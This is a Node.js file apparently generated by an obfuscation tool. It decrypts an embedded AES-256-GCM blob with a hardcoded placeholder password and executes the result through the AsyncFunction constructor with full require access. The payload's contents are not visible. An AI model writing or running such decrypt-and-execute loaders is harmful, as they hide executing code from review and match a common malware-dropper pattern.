// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 3.0.0                                     ║
// ║  Encrypted: 2026-03-19 13:04:45 UTC                   ║
// ║  Cipher   : AES-256-GCM                               ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v3.0.0
(async () => {
  if (typeof require === 'undefined') {
    throw new Error('[Obfuscationary] Browser mode not supported for multi-layer. Use Node.js.');
  }

  const _b64            = 'yUnXZpIbpL0Le3eES0K9oQwwjtVVvBXOC0DqDkjA5YZOQa8MT4fyCdH9DQlA4EuVxlwWUcJNdXPedLV7L15hWS8y4RtxhXv4av/wx87RXwL3Y8l+KZh/r/vpvhzcqCteavecpFxWjvN2EOufhcnJ6wPkELbI7wVe8ezX0uBclL6b8RieYgBN8jwGbMe5gVF8sv/K5Xd2Lvb6PGk9TGg94xqs9jkssnj5o50L59rU5cXVoDBxignPLSSnkv0h6b/6GHA8d4EmE3p9jhR9+VEL60LTHqpdiKE79ZkarrRpDnUGwgy56cce0sS9EzugoZ2cmR13PSBigMuhmsuR/lL2WB6JbxaX+TyTwHXQt/bRcouPLMjptvSC1Dm4Hj2SwD37Asc4zGLQUnyqayPtEjy9BDTDpVFmIkoNPTmXcIiZ25V90aiBrxlqWdcgmhgmlA2dPsi/XwXYAyyeep5T/t8WKb1z2xhN8nVHzggEWVD6+hPtPuw59qh65tTivRJIMTk/0111cVlfH6s9bvk0AENLmHEzPApeSNj1CQu+16kU7J70gVXc/nAmHQYVWs/tZNYD5/aJEK589YUQ0tA1zaHF6k3z3zWvwUeZ15Hp3t/rnJxhJCa2d+TxVo18+wZ3FVVFY4mtfy1OBueJfEon05WtQNCyXhTp0ZYkUcHvHUe98akka1j8yJj5n27Sce9VggdLnvjsSXRuwl4SW6ECc6mvHOOsWxXE7Ig0jBlD7Fk8yKXq5sm2OeBHoai5GHwgtjb01dbEsido1skagUpf/P82s23pJ/EfG9JV6h92z2rBQmr3I2hxYnTnOQbQEYxvrhkGCjZR1USahD5BT/JFlMFhrx9ndPmd4GrKylPKtL7eVSNSdLxz/nhnKV+odf+wWMhM/Rf9jqzMKpNpBo3vNwNwl4alp7ylJcCsj18n86Rj3ajEBJrS1fZOG0/iSpt9nTpG6bZpT9VB8GpP3c7EWKcHSdI41d89hweU8ufknCEVAbwbjfUJYnRLohOsTaADalGB9HhTO/lHwBoX6eiN6QtoMLmjWlyB5oYQtDhUoyVuVcMAtD7gmGPoBnYEgwWc3zTrK1T4OLNryiW6vZwMcr3CopcglNdmzI5a14caXEuGx1eqfVXW63aMfop2XlgJtpFRFiygCHZQBikg9l1JaCaRacJANea9K3Y0umKLfnIe1LNvEKkoQsmjps9g+mi+17OEIFGgSo9TiQPHVuozzw1ZKpSUMf6YQZdpTJ0WWIDHRuLPirYf6EsVIXFEE36B61biolLmrAIw8fK7VEEBh/bIL0hGzokS9DgSQFNOEJ35Iltjssluu5u1yJGrRftaimtG4eUV+Rm1I7gjO7wu745/I7DASMoF4W5vhIzRmW1538Fljf5TMVOrqQ==';
  const _INTEGRITY_HASH = '819c31d21fcf8e7e2c1bba53a1874d71fa30ae2ae89798b06985e0d971567bbb';
  let   _src;

  const _PWDS  = ["change_me_to_a_strong_password"];
  const _ITERS = 600000;

  // Integrity check
  const _crypto2 = require('crypto');
  const _actualHash = _crypto2.createHash('sha256').update(_b64).digest('hex');
  if (_actualHash !== _INTEGRITY_HASH) {
    throw new Error('[Obfuscationary] Tamper detected! File integrity check failed.');
  }

  // Multi-layer decrypt (reverse order)
  let _data = Buffer.from(_b64, 'base64');
  for (let _i = _PWDS.length - 1; _i >= 0; _i--) {
    const _pw   = _PWDS[_i];
    const _salt = _data.slice(0, 16);
    const _iv2  = _data.slice(16, 28);
    const _ct2  = _data.slice(28);
    const _ctag2 = _ct2.slice(_ct2.length - 16);
    const _cdat2 = _ct2.slice(0, _ct2.length - 16);
    const _key2  = _crypto2.pbkdf2Sync(_pw, _salt, _ITERS, 32, 'sha256');
    const _dec2  = _crypto2.createDecipheriv('aes-256-gcm', _key2, _iv2);
    _dec2.setAuthTag(_ctag2);
    _data = Buffer.concat([_dec2.update(_cdat2), _dec2.final()]);
  }
  _src = _data.toString('utf8');

  const _Fn = Object.getPrototypeOf(async function(){}).constructor;
  await _Fn('module', 'exports', 'require', '__filename', '__dirname', _src)(
    module, exports, require, __filename, __dirname
  );
})();
